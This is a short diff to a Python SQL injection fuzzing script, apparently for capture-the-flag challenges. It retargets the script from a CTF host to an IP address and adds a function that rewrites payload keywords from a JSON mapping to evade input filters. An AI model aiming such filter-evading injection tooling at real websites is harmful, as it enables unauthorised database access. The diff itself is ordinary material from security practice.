@@ -1,11 +1,11 @@
 import json
 from requests_html import HTMLSession
 
-url = 'http://532-8a7238f0-16ac-4231.nss.ctfer.vip:9080/index.php'
+url = 'http://1.14.71.254:28038/'
 prefix = """1'"""
-cmd = 'id'
-method = 'post'
-exclude = 'SQL Injection Checked'
+cmd = 'wllm'
+method = 'get'
+exclude = '非法'
 s = HTMLSession()
 
 work_lst = []
@@ -32,6 +32,14 @@ def init():
     jso = open('sql_fuzz.json', 'r').read()
     r = json.loads(jso)
     return r
+
+def repl(payload):
+    import re
+    from re import  escape
+    obj = init()
+    for k, v in obj.items():
+        payload = re.sub(escape(k), escape(v), payload, flags=re.IGNORECASE)
+    return payload.replace('\\', '')
 
 
 if __name__ == '__main__':
